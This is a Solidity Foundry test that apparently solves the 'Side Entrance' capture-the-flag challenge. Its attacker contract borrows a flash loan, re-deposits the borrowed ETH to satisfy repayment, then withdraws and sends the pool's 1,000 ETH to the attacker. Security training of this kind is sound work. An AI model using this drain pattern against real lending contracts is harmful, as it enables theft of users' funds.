// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public payable {
        /**
         * EXPLOIT START *
         */
        console.log("Balance lending pool before", address(sideEntranceLenderPool).balance);
        console.log("Balance attacker before", attacker.balance);
        AttackerSideEntranceLenderPool aselp = new AttackerSideEntranceLenderPool(sideEntranceLenderPool, attacker);
        aselp.requestFlashLoan();
        aselp.withdrawFunds();
        console.log("Balance lending pool after", address(sideEntranceLenderPool).balance);
        console.log("Balance attacker after", attacker.balance);

        // (bool sent,) = payable(address(this)).call{value: address(this).balance}("");
        // require(sent, "Error transfer");
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}

contract AttackerSideEntranceLenderPool {
    address s_attacker;
    SideEntranceLenderPool s_selp;

    uint256 amount = 1_000 ether;

    error AttackerSideEntranceLenderPool__NotOwner(address);
    error AttackerSideEntranceLenderPool__TransferError();

    constructor(SideEntranceLenderPool selp, address attacker) payable {
        s_attacker = attacker;
        s_selp = selp;
    }

    function requestFlashLoan() external {
        s_selp.flashLoan(amount);
    }

    function execute() external payable {
        // s_selp.deposit{value: amount}();
        // s_selp.deposit{value: amount}();
        s_selp.deposit{value: amount}();
    }

    function withdrawFunds() external {
        s_selp.withdraw();
        (bool sent,) = payable(s_attacker).call{value: address(this).balance}("");
        if (!sent) {
            revert AttackerSideEntranceLenderPool__TransferError();
        }
    }

    receive() external payable {}

    fallback() external payable {}
}
